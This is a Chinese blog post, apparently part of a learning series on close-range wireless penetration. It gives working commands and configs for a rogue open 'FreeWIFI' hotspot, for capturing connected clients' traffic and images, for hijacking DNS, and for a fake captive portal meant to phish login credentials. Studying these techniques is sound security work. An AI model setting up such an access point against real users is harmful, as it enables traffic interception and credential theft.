<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        likesoso - 随便写写
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.1.1"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            近源渗透(4)
        </p>
        <hr>
    </div>
    <div class="post-content">
        <p>&nbsp;&nbsp;&nbsp;&nbsp;到这一章，我们的基础学习就已经结束了，学到了一些802.11的原理知识,以及kali下的基础操作。接下来进入正题。不难发现之前的操作，只能做一些拒绝服务攻击，或者是靠字典的强大，爆破出wifi密码，从而连接到目标网络内。接下来记录一下我的wifi钓鱼学习笔记。</p>
<p>##安装环境</p>
<p>一个支持AP模式的无线网卡，这里我推荐TP-LINK的TL-WN722N Ver1.0，咸鱼30rmb购得。推荐ver1版本的，ver2的kali没得自带的驱动。</p>
<p><img src="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/4-1.jpg" alt="4-1.jpg"></p>
<p><strong>安装hostapd、dnsmasq、php等</strong></p>
<p>###hostpad</p>
<p>实现了热点的建立，管理等功能</p>
<p>首先创建一个open.conf作为热点的配置文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">interface&#x3D;wlan0</span><br><span class="line">ssid&#x3D;FreeWIFI</span><br><span class="line">driver&#x3D;nl80211</span><br><span class="line">channel&#x3D;1</span><br><span class="line">hw_mode&#x3D;g</span><br></pre></td></tr></table></figure>
<p>###dnsmasq</p>
<p>提供DNS和DHCP服务的简易轻量级配置工具</p>
<p>向/etc/dnsmasq.conf添加一条：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhcp-range&#x3D;172.5.5.100, 172.5.5.250, 12h</span><br><span class="line">interface&#x3D;wlan0</span><br></pre></td></tr></table></figure>

<p>重启服务：</p>
<p><code>systemctl restart dnsmasq</code></p>
<p>运行以下命令，消除系统对网卡的影响</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmcli radio wifi off #表示关闭wifi</span><br><span class="line">rfkill unblock wlan #解锁无线网卡</span><br><span class="line">ifconfig wlan0 172.5.5.1&#x2F;24</span><br><span class="line">hostapd open.conf #开启wifi</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<p><img src="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/4-2.jpg" alt="4-2.jpg"></p>
<p>此时SSID为Freewifi的无密码wifi已经开启，但是这个wifi不能上网，我们还需要将wlan0转发到能出网的eth0上面</p>
<p>运行<code>ifconfig</code>查看外网网卡为eth0</p>
<p><img src="/2020/09/03/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F-4/4-3.jpg" alt="4-3.jpg"></p>
<p><code>sysctl -w net.ipv4.ip_forward=1</code>开启ip路由转发功能，这个是临时配置，修改/etc/systcl.conf 可以永久更改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE #转发</span><br></pre></td></tr></table></figure>

<p>这时钓鱼wifi已经可以连接到互联网了，用wireshark等抓包工具对eth0进行抓包。即可抓到连接wifi的客户端的所有流量。</p>
<p>##driftnet<br>简单的图片捕获工具</p>
<p>kali安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install driftnet</span><br><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
<p>经过测试，成功率不是很高。很多图片都抓不到</p>
<p>##DNS 劫持<br>在本地部署钓鱼网站，无线客户端连接网络时，通过DHCP服务不仅能获得本地的ip地址，还包括DHCP服务指定的DNS解析地址。</p>
<p>先在本地搭建钓鱼网站，以flash为例子：</p>
<p>通过对DNS服务器进行配置，打开/etc/dnsmasq.conf，添加格式：address=/url/ip</p>
<p>添加一条：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address&#x3D;&#x2F;#&#x2F;172.5.5.1</span><br><span class="line">#在url处填#，将解析所有的地址</span><br></pre></td></tr></table></figure>
<p>重启dnsmasq即可</p>
<p><code>systemctl restart dnsmasq</code></p>
<p>之后连接上wifi之后就可以完成劫持了</p>
<p>##配置Captive Protal</p>
<p>连接上免费的wifi后，要求认证。以此方式欺骗得到账号密码。</p>
<p>以android设备为例子，当设备接入无线网络时，会尝试请求访问client3.google.com/generate_204并根据返回结果来判断网络状况，返回204则表示网络正常，<strong>返回302则表示存在认证</strong>，并以弹窗的方式显示在手机中。</p>
<p><strong>1.配置iptables</strong></p>
<p>将所有的流量包丢弃，但是允许DNS查询，及向网关特定端口请求（172.5.5.1的80端口）；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -i wlan0 -p tcp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -p udp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -p tcp --dport 80 -d 172.5.5.1 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i wlan0 -j DROP</span><br></pre></td></tr></table></figure>
<p>将来自nat网络对80端口的请求全部转发到172.5.5.1:80</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 172.5.5.1:80</span><br></pre></td></tr></table></figure>
<p>来自nat的dns请求都转发到172.5.5.1的53端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to-destination 172.5.5.1:53</span><br><span class="line">iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to-destination 172.5.5.1:53</span><br></pre></td></tr></table></figure>
<p>以上配置后，android连接到FreeWifi后，请求client3.google.com/generate_204，会被转发到172.5.5.1:80</p>
<p><strong>配置nginx</strong></p>
<p><code>vim /etc/nginx/sites-enabled/default</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">#web目录</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                if (!-e $request_filename) &#123;</span><br><span class="line">                         rewrite ^&#x2F;(.*)$ &#x2F;index.html redirect;</span><br><span class="line">#302跳转</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">#配置php</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">                include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">                fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.3-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时连接上wifi，会自动弹出认证界面。接下来就是搭建钓鱼页面了。</p>

    </div>

    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>